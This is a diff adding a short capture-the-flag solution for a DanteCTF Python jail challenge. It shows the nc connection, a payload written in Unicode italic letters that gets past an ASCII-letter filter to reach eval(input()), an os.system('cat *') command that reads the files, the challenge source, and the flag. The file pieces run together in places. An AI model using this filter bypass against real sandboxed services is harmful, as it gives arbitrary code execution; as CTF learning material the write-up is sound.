@@ -1,0 +1,18 @@
+$ nc challs.dantectf.it 31520
+> 𝑒𝑣𝑎𝑙(𝑖𝑛𝑝𝑢𝑡())
+__import__('os').system('cat *')
+DANTE{4b4nd0n_all_h0p3_y3_who_3nter}#!/usr/local/bin/python3
+
+from string import ascii_letters
+
+code = input('> ')
+
+if any(c in ascii_letters for c in code):
+    print('You will never leave this place!')
+elif any(c in '.:;,-_@"=/%\\' for c in code):
+    print('You will never reach this point, but still, you CANNOT leave!')
+else:
+    exec(code)
+
+
+FLAG:DANTE{4b4nd0n_all_h0p3_y3_who_3nter}
